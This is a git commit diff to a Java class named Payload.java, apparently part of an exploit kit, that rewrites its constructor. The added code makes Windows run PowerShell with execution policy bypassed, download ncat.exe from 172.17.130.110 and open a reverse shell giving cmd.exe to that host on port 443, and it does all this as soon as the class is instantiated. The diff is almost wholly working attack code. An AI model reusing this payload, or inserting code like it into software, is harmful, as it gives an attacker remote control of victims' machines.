d26f9b30ee46406a7110d9c710b9d0bfdae8604c
Unknown <5295307+NullbutC00L@users.noreply.github.com>
2022-01-05 10:35:54 +0000

    Update Payload.java

--- code/Payload.java
+++ code/Payload.java
@@ -1,10 +1,10 @@
 public class Payload {
-  public Payload() {
-    try {
-      String payload = "ls";
-      String[] cmds = { "/bin/bash", "-c", payload };
-      java.lang.Runtime.getRuntime().exec(cmds);
-    } catch (Exception e) {
+    public Payload(){
+ try {
+            String payload = "powershell -exec bypass IEX(New-Object Net.WebClient).downloadFile('http://172.17.130.110/ncat.exe','ncat.exe');.\\ncat.exe -e cmd.exe 172.17.130.110 443";
+            String cmds = "cmd.exe /c "+ payload;
+            java.lang.Runtime.getRuntime().exec(cmds);    
+ } catch (Exception e) {
+	}
     }
-  }
 }
